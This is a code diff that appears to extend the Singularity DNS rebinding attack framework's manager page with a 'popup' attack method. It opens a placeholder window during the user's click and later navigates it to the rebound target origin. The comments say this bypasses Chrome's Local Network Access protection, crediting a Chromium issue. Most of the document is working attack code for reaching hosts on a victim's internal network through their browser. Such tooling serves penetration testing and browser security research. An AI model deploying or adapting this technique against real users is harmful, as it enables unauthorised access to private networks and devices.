@@ -199,6 +199,8 @@ const Frame = (id, url) => {
     let timer = null;
     let errorCount = 0;
     let interval = null;
+    let popupName = null;
+    let popupWindow = null;
     return {
         getId() {
             return fmid;
@@ -220,6 +222,18 @@ const Frame = (id, url) => {
         },
         setInterval(val) {
             interval = val;
+        },
+        getPopupName() {
+            return popupName;
+        },
+        setPopupName(val) {
+            popupName = val;
+        },
+        getPopupWindow() {
+            return popupWindow;
+        },
+        setPopupWindow(val) {
+            popupWindow = val;
         },
         getErrorCount() {
             return errorCount;
@@ -543,6 +557,12 @@ function ipToHexOrOriginal(input) {
 
             let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload));
             self.getFrameManager().frame(fid).setInterval(interval);
+            // Unique popup name per target. No user gesture is available on
+            // this (scan/autoattack) path, so window.open() in the attack
+            // frame will normally be blocked and fall back to its button;
+            // a unique name at least prevents concurrent frames from
+            // reclaiming each other's popup.
+            self.getFrameManager().frame(fid).setPopupName(`soo-popup-${fid}`);
 
             self.addFrameToDOM(self.getFrameManager().frame(fid));
             self.getFrameManager().frame(fid).setTimer(setInterval((() => {
@@ -642,6 +662,15 @@ function ipToHexOrOriginal(input) {
                     cmd: 'startFetch',
                     param: null
                 }, "*");
+                } else if (configuration.getAttackMethod() === 'popup') {
+                    const placeholder = fm.frame(fid).getPopupWindow();
+                    msg.source.postMessage({
+                        cmd: 'startPopup',
+                        param: {
+                            popupName: fm.frame(fid).getPopupName(),
+                            placeholderOpened: !!(placeholder && !placeholder.closed)
+                        }
+                    }, "*");
                 } else {
                     msg.source.postMessage({
                         cmd: 'startReloadChildFrame',
@@ -656,6 +685,33 @@ function ipToHexOrOriginal(input) {
                     cmd: 'stop'
                 }, "*");
             };
+
+            // The attack frame has detected the DNS rebinding and asks us
+            // to navigate the placeholder popup we opened on the user's
+            // click. We hold a valid handle in this document, and setting a
+            // window's location is allowed cross-origin, so this needs no
+            // user activation anywhere. After this navigation the popup is
+            // on the attack frame's origin and the frame can reclaim it.
+            if (msg.data.status === 'navigatePopup') {
+                const frame = fm.frame(fid);
+                const placeholder = frame.getPopupWindow();
+                const a = document.createElement('a');
+                a.href = frame.getURL();
+                const expectedOrigin = `${a.protocol}//${a.host}`;
+                a.remove();
+                if (placeholder && !placeholder.closed &&
+                    typeof msg.data.url === 'string' && msg.data.url.startsWith(expectedOrigin + '/')) {
+                    console.log(`Navigating placeholder popup '${frame.getPopupName()}' to ${msg.data.url}`);
+                    placeholder.location.href = msg.data.url;
+                } else {
+                    console.log(`Cannot navigate placeholder popup for ${msg.origin} (closed, missing, or unexpected URL)`);
+                    msg.source.postMessage({ cmd: 'popupNavigationFailed', param: null }, '*');
+                }
+            }
+
+            if (msg.data.status === 'popupBlocked') {
+                console.log(`Popup blocked for ${msg.origin}. Allow popups for this site, or click the button shown in the attack frame, then restart the attack.`);
+            }
 
             if (msg.data.status === 'requiresHttpAuthentication') {
                 document.getElementById(fid).contentWindow.postMessage({
@@ -693,6 +749,44 @@ function ipToHexOrOriginal(input) {
             const UIAttackMethod = document.getElementById('attackmethod').value;
             configuration.setAttackMethod (UIAttackMethod);
 
+            // Popup attack method (technique credit:
+            // https://issues.chromium.org/issues/475274565 -- Local Network
+            // Access bypass via a new window / top-level navigation with
+            // DNS rebinding). window.open() requires transient user
+            // activation, which does not propagate from this manager page
+            // into the (cross-origin) attack iframe via postMessage, so the
+            // attack frame's window.open() gets blocked. Instead, open a
+            // named placeholder popup *synchronously* here, inside the
+            // "Start Attack" click handler, where activation is valid
+            // (Chrome/Firefox allow one popup per user gesture). We keep
+            // the handle in this document: the attack frame generally
+            // cannot retrieve a handle to this cross-origin placeholder by
+            // name, so instead it probes for the rebinding and asks us (via
+            // postMessage) to navigate the placeholder for it -- setting a
+            // window's location is allowed cross-origin. Once navigated to
+            // the rebinding hostname, the popup shares the attack frame's
+            // origin and the frame can reclaim and read it.
+            // If begin() was invoked without a gesture (?startattack), this
+            // returns null and the attack frame falls back to asking for a
+            // click on its own button.
+            let popupName = null;
+            let popupPlaceholder = null;
+            if (UIAttackMethod === 'popup') {
+                popupName = `soo-popup-${Math.floor(Math.random() * 2 ** 32)}`;
+                const placeholder = window.open('about:blank', popupName, 'width=900,height=700');
+                popupPlaceholder = placeholder;
+                if (placeholder) {
+                    try {
+                        placeholder.document.title = 'Singularity popup attack';
+                        placeholder.document.body.innerHTML =
+                            '<p>Singularity popup attack window. Do not close: this window will be navigated to the target once DNS has rebound.</p>';
+                    } catch (e) { /* placeholder content is best-effort */ }
+                    console.log(`Opened placeholder popup '${popupName}' for the popup attack.`);
+                } else {
+                    console.log('Placeholder popup blocked (no user gesture?). The attack frame will ask for a click instead.');
+                }
+            }
+
             const UiAttackWsProxyPort = document.getElementById('wsproxyport').value;
             configuration.setWsProxyPort(UiAttackWsProxyPort);
 
@@ -706,6 +800,9 @@ function ipToHexOrOriginal(input) {
                 .replace("%6", document.getElementById('targetport').value)
                 //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
                 .replace("%7", 'soopayload.html') + '?rnd=' + Math.random());
+
+            fm.frame(fid).setPopupName(popupName);
+            fm.frame(fid).setPopupWindow(popupPlaceholder);
 
             self.addFrameToDOM(fm.frame(fid));
 
